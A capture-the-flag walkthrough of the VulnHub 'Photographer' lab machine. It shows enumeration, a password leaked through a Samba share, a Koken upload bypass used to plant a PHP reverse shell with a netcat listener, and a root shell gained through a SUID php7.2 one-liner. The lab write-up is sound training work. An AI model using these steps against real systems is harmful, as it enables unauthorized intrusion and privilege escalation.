# VulnHub > Photographer

This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.

# User flag

## Services enumeration

Nmap discovers 2 web services running on ports 80 and 8000, as well as a network share.

~~~
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
Service Info: Host: PHOTOGRAPHER
~~~

## Web (80)

Starting with the web service on port 80/tcp does not reveal anything interesting. There is no `robots.txt` file that may have disclosed hidden locations.

~~~
unknown@localhost:/data/tmp$ curl -I http://172.16.222.132/robots.txt
HTTP/1.1 404 Not Found
Date: Sun, 30 Aug 2020 07:08:15 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1
~~~

And `gobuster` doesn't find anything with the `common.txt` dictionary. We may refine this later with a more consistent dictionary, unless we find something with the other services.

~~~
unknown@localhost:~$ gobuster dir -u http://172.16.222.132 -w /data/src/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://172.16.222.132
[+] Threads:        10
[+] Wordlist:       /data/src/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/30 09:00:11 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
~~~

## Samba

Let's have a look at the Samba share.

~~~
unknown@localhost:~$ smbclient -L //172.16.222.132
Enter SAMBA\unknown's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
~~~

2 files are available, but only 1 is interesting: `mailsent.txt`.

~~~
unknown@localhost:~$ smbclient //172.16.222.132/sambashare
Enter SAMBA\unknown's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 03:30:07 2020
  ..                                  D        0  Tue Jul 21 11:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 03:22:23 2020

		278627392 blocks of size 1024. 264268400 blocks available
smb: \> get mailsent.txt -
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
getting file \mailsent.txt of size 503 as - (491.2 KiloBytes/sec) (average 491.2 KiloBytes/sec)
~~~

The email is interesting because it discloses Daisa's credentials:

* Email address: `daisa@photographer.com`
* Password: `babygirl`

## Web (8000)

Time to discover what is running on port 8000. Connecting to this service shows a blog-like page built with Koken (shown in the footer). Connecting to the `/admin` location redirects without too much surprise to the backend authentication page, where we can use the credentials found previously.

Browsing through the pages of the admin panel reveals that Daisa is an administrator.

## Reverse shell

Searching on the Internet exploits affecting Koken leads to this [link](https://www.exploit-db.com/exploits/48706).

Download a [PHP shell from pentestmonkey](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz), edit it to replace your IP and port, and rename it `image.php.jpg`.

From the Koken admin interface, go to Library > Content > Import Content and upload the PHP shell. Intercept the request in BurpSuite and modify the file name to `image.php` before sending the request.

Start a listener (e.g. `rlwrap nc -nlvp 4444`) and call your shell from the browser.

## User flag

From our reverse shell, we are now able to get the user flag:

~~~
www-data@photographer:/home/daisa$ cat user.txt
cat user.txt
d41d8cd98f00b204e9800998ecf8427e
~~~


# Root flag

## SUID files

Getting the root flag is likely to require a privilege escalation. Let's check the files owned by `root` with the `SUID` bit set:

~~~
www-data@photographer:/home/agi/share$ find / -type f -user root -perm -u=s 2>/dev/null
</agi/share$ find / -type f -user root -perm -u=s 2>/dev/null                
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
~~~

Interestingly, `php7.2` has the SUID but set. Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid) reveals that we can exploit it to run a root shell:

~~~
www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
<sr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"                         
bash-4.3# whoami
whoami
root
~~~

## Root flag

Now that we are `root`, let's read the flag.

~~~
bash-4.3# cd /root
cd /root
bash-4.3# ls -la
ls -la
total 44
drwx------  4 root root 4096 Jul 21 05:44 .
drwxr-xr-x 24 root root 4096 Aug 30 03:14 ..
-rw-------  1 root root   49 Jul 21 05:44 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
-rw-------  1 root root  216 Jul 20 20:42 .mysql_history
drwxr-xr-x  2 root root 4096 Jul 20 20:34 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root 5223 Jul 21 05:44 .viminfo
-rw-------  1 root root 2084 Jul 21 05:44 proof.txt
bash-4.3# cat proof.txt
cat proof.txt
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
bash-4.3# 
~~~
